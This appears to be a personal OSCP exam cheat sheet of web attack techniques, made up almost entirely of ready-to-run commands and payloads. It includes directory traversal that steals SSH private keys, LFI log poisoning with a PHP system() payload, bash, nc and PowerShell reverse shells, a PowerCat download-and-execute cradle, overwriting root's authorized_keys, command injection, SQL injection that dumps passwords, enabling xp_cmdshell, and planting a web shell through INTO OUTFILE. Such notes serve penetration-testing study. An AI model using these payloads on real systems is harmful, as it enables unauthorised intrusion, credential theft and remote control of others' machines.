Tags: [[OSCP]]

---
- phpInfo: Look for `Document_Root`
- Wordpress https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell

# Directory Traversal
- Show `ect/passwd` from php: `http://targeturl.com/index.php?page=../../../../../../../../../etc/passwd
- Grabbing/Saving SSH RSA Private Key of Username: `curl http://targeturl.com/index.php?page=../../../../../../../../../home/username/.ssh/id_rsa | 
    - Logging in with RSA key: `ssh -i dt_key -p 2222 username@targeturl.com
- Windows - Grafana Vulnerability (CVE-2021-43798): `http://ipaddress:3000/public/plugins/mysql/../../../../../../../../Users/Install.txt
- URL encoding: `curl http://ipaddress/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords

# Local File Inclusion (LFI) through Log Poisoning
Write executeable code to Apache's access.log file in /var/log/apache2/
- Add PHP snippet to user agent header of GET request: `<?php echo system($_GET['cmd']); ?>
- Modify GET request with directory traversal to log file & cmd: `GET /index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la
- Reverse Shell
    - Start netcat listener: `nc -nvlp 4444`
    - Mod GET cmd to bash reverse shell one-liner = `bash -c "bash -i >& /dev/tcp/local.host.ip.address/4444 0>&1"
        - URL Encoded: `GET index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Flocal.host.ip.address%2Fport%200%3E%261%22
- Alt to show sensitive file: `GET /index.php?page=../../../../../../../../../xampp/htdocs/secret.txt&cmd=cat

# PHP Wrappers (Bypassing file inclusion filters)
Filter (To read contents)
- No encoding: `curl http://targeturl.com/index.php?page=php://filter/resource=admin.php
- Base64 Encode: `curl http://targeturl.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
- Alt Base64 encode: `curl http://192.168.244.16/meteor/index.php?page=php://filter/convert.base64-encode/resource='/var/www/html/backup.php'
    - To decode Base64 : echo "BaSE64StR1nG0fL3tt3rsaNDnuMB34s!" | base64 -d
Data (Code Execution)
- `curl http://targetip/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>`

# Remote File Inclusion
- Serve reverse shell script: `python3 -m http.server 80` 
- Curl reverse shell through target: `curl "http://targeturl.com/index.php?page=http://HOST.IP.ADDRESS/simple-backdoor.php&cmd=ls"`
- Run Netcat to capture reverse shell: `nc -nvlp 80
# File Upload with Executables
Bypass .php with .phps .php7 .pHP .PhP
Setup Netcat Listener: `nc -nvlp 4444`
Use Powershell to encode reverse shell one-liner
- `pwsh`
- `$Text = '$client = New-Object System.Net.Sockets.TCPClient("HOST.IP.ADDRESS",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'`
- To Unicode`$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)`
- To base64 `$EncodedText =[Convert]::ToBase64String($Bytes)` (with `$EncodedText` as encoded one-liner)
- `curl http://target.ip.address/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20pastedversionof$encodedText`
- Check netcat listener for reverse shell

# File Upload with non-executables
- Use Burp Suite to capture a test upload  of `test.txt` file
- Change filename in request to `../../../../../../../../test.txt` to see if upload is successful
- If target runs SSH, then try overwriting a file like `authorized_keys`
	- `ssh-keygen` with filename `fileup`, then `cat fileup.pub > authorized_keys`
	- Upload `authorized_keys` to `../../../../../../../../root/.ssh/authorized_keys
	- clear `known_hosts` file: `rm ~/.ssh/known_hosts`
	- `ssh -p 2222 -i fileup root@target.ip.address`

# OS Command Injection
Run Burpsuite and test command injection into a field
- Look for URL encoded version of command in Burp to ID field (eg. Archive)
- Send POST request with curl: `curl -X POST --data 'Archive=git version' http://target.ip.address:port/archive`
	- Git for Windows will output version & "windows"
	- Git for Linux only shows version number
- Send POST request with curl & 2nd command: `curl -X POST --data 'Archive=git%3Bipconfig' http://target.ip.address.here:port/archive`
- Test if CMD or PowerShell will run with: [(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell]
	- [URL Encoding](https://meyerweb.com/eric/tools/dencoder/): `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://target.ip.address.here:port:8000/archive`
- If it shows PowerShell (pwsh), use PowerCat to create a reverse shell
	- Copy Powercat to directory: `cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`
	- Start http server from same directory: `python3 -m http.server 80`
	- Start Netcat listener in another tab: `nc -nvlp 4444`
	- PowerShell one-liner for PowerCat download/shell start: `IEX (New-Object System.Net.Webclient).DownloadString("http://target.ip.address/powercat.ps1");powercat -c netcat.ip.address.here -p 4444 -e powershell`
	- Send POST request with PowerShell one-liner URL Encoded: `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2Fnetcat.ip.address.here%2Fpowercat.ps1%22)%3Bpowercat%20-c%20netcat.ip.address.here%20-p%204444%20-e%20powershell' http://target.ip.address.here:port/archive`
		- Check tab with http server for GET request
		- Check tab with netcat for reverse shell (PowerShell)
- For Linux,
	- Start netcat listener `nc -nvlp 4444
	- Open 2nd terminal and run netcat one-liner inside curl command `curl -X POST --data 'Archive=git%3Bnc%20netcat.ip.address.here%4444%20-e%20/bin/bash' http://target.ip.address.here/archive`
	- Return to netcat listener for shell, upgrade to Full TTY with python if necessary: `python -c 'import pty; pty.spawn("/bin/bash")'192.

# SQL Injection Attacks
- [https://github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)  
- [https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt)  
- [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
### **mysql**
- Remember to add `;` to the end of commands!
- Connect with `mysql -u root -p'root' -h target.ip.address.here -P 3306` 
	- If there's an SSL certificaste issue, add `--skip-ssl-verify-server-cert` on the end
- Find the SQL Version: `select version();`
- Verify current database user: `select system_user();`
- Show Available Databases: `show databases;`
- Retrieve authentication string for user: `SELECT user, authentication_string FROM mysql.user WHERE user = 'username';
- Retrieve all strings from a user: `SELECT * FROM mysql.user WHERE user = 'username';`
### **MSSQL**
- Use impacket (Kali tool) to connect: `impacket-mssqlclient username:password@target.ip.address.here -windows-auth`
- Find MSSQL version: `SELECT @@version;`
- Show Available Databases: `SELECT name FROM sys.databases;`
- Review a database: `SELECT * FROM databasenamehere.information_schema.tables;`
- Review a specific table: `select * from databasename.tableschema.tablename;`
- Retrieve a list of usernames: `select name from sys.database_principals;`
## Identifying SQLi via Error-base Payloads
From a browser login to an SQL database 
- Test authentication bypass via injection into username: `admin' OR 1=1 -- //`
- Find MySQL version with injection: `admin' OR 1=1 in (SELECT @@version) -- //`
- Find passwords with injection: `admin' OR 1=1 in (SELECT password FROM users) -- //`
- Find specific password: `admin' OR 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
### UNION-based payloads
From a browser login to an SQL database
- Determine number of table columns: `' ORDER BY 1-- //` 
	- Increase the value (eg. `2--`, `3--`, ect) until error, columns=errorvalue-1
- Create UNION query with # values = # columns: 
	- Eg. for columns=5: `%' UNION SELECT database(), user(), @@version, null, null -- //`
- To avoid clashes in column 1, shift values right: ````
	- Eg. for columns=5: `' UNION SELECT null, null, database(), user(), @@version  -- //
- Enumerate `columns` table: `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
- Enumerate other tables identified from information_schema: `' UNION SELECT null, username, password, description, null FROM users -- //`
## Blind SQLi
In a browser address bar that shows username, test injection with a delay: `http://target.ip.address.here/login.php?user=username' AND IF (1=1, sleep(3),'false') -- //`

## **Manual Code Execution - MSSQL
Enable code execution in using `xp_cmdshell`: 
1. Login as administrator: `impacket-mssqlclient administrator:password@target.ip.address.here -windows-auth`
2. Enable xp_cmdshell (disabled by default): `EXECUTE sp_configure 'show advanced options', 1;` (then run `RECONFIGURE` to install)
3. Run xp_cmdshell: `EXECUTE sp_configure 'xp_cmdshell', 1;`  (then run `RECONFIGURE` to install)
4. Test xp_cmdshell: `EXECUTE xp_cmdshell 'whoami';`

## **Manual Code Execution - MYSQL**
In a SQLi vulnerable browser field;
- Create webshell.php (with `<?php system($_GET['cmd']);?>`) in a writeable web folder: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
- Inject commands through in browser address bar: `target.ip.address.here/tmp/webshell.php?cmd=cat%20flag.txt`
